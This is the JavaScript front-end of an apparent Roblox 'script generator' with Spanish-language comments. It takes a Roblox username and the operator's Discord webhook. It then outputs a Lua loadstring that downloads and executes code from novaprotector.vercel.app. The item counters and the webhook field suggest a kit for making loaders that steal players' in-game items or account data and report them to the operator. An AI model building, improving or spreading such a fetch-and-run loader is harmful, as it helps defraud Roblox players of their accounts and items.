// NovaDynamics Moreira — Script Generator
const robloxUser = document.getElementById('robloxUser');
const userCard = document.getElementById('userCard');
const userName = document.getElementById('userName');
const userId = document.getElementById('userId');
const webhookInput = document.getElementById('webhook');
const generateBtn = document.getElementById('generateBtn');
const resultBox = document.getElementById('resultBox');
const resultOutput = document.getElementById('resultOutput');
const copyBtn = document.getElementById('copyBtn');
const gistLoader = document.getElementById('gistLoader');
const gistNameGroup = document.getElementById('gistNameGroup');
const gistName = document.getElementById('gistName');
const modeCards = document.querySelectorAll('.mode-card');
const brainrotCounter = document.getElementById('brainrotCounter');
const skinCounter = document.getElementById('skinCounter');
const gearCounter = document.getElementById('gearCounter');
const tags = document.querySelectorAll('.tag');
const langBtns = document.querySelectorAll('.lang-btn');

// Contadores
let selectedBrainrots = 6;
let selectedSkins = 25;
let selectedGears = 24;

// Actualizar contadores
function updateCounters() {
    brainrotCounter.textContent = `${selectedBrainrots}/285`;
    skinCounter.textContent = `${selectedSkins}/25`;
    gearCounter.textContent = `${selectedGears}/24`;
}
updateCounters();

// Cambiar modo de script
modeCards.forEach(card => {
    card.addEventListener('click', () => {
        modeCards.forEach(m => m.classList.remove('selected'));
        card.classList.add('selected');
    });
});

// Mostrar/ocultar nombre de Gist
gistLoader.addEventListener('change', () => {
    gistNameGroup.classList.toggle('hidden', !gistLoader.checked);
});

// Buscar usuario de Roblox (simulación)
let searchTimeout;
robloxUser.addEventListener('input', () => {
    clearTimeout(searchTimeout);
    const value = robloxUser.value.trim();
    if (value.length < 3) {
        userCard.classList.add('hidden');
        return;
    }
    searchTimeout = setTimeout(() => {
        // Simulación de búsqueda
        userName.textContent = value;
        userId.textContent = `ID: ${Math.floor(Math.random() * 9000000000) + 1000000000}`;
        userCard.classList.remove('hidden');
    }, 600);
});

// Cambiar idioma
langBtns.forEach(btn => {
    btn.addEventListener('click', () => {
        langBtns.forEach(b => b.classList.remove('active'));
        btn.classList.add('active');
    });
});

// Generar script
generateBtn.addEventListener('click', async () => {
    const user = robloxUser.value.trim();
    const webhook = webhookInput.value.trim();
    
    if (!user) {
        alert('⚠️ Ingresa un nombre de usuario de Roblox');
        return;
    }
    if (!webhook) {
        alert('⚠️ Ingresa tu webhook de Discord');
        return;
    }
    
    generateBtn.textContent = '⏳ Generando...';
    generateBtn.disabled = true;
    
    // Simular generación
    await new Promise(resolve => setTimeout(resolve, 1500));
    
    const fakeId = Math.random().toString(36).substring(2, 18);
    const loadstring = `loadstring(game:HttpGet("https://novaprotector.vercel.app/api/raw?id=${fakeId}"))()`;
    
    resultOutput.value = loadstring;
    resultBox.classList.remove('hidden');
    resultBox.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
    
    generateBtn.textContent = '✨ GENERAR SCRIPT';
    generateBtn.disabled = false;
});

// Copiar al portapapeles
copyBtn.addEventListener('click', async () => {
    try {
        await navigator.clipboard.writeText(resultOutput.value);
        copyBtn.textContent = '✅ ¡Copiado!';
        setTimeout(() => copyBtn.textContent = '📋 Copiar al portapapeles', 2500);
    } catch {
        resultOutput.select();
        document.execCommand('copy');
        copyBtn.textContent = '✅ ¡Copiado!';
        setTimeout(() => copyBtn.textContent = '📋 Copiar al portapapeles', 2500);
    }
});

// Cerrar tags al hacer clic en la X
document.addEventListener('click', (e) => {
    if (e.target.classList.contains('tag-close')) {
        e.target.parentElement.style.display = 'none';
    }
});
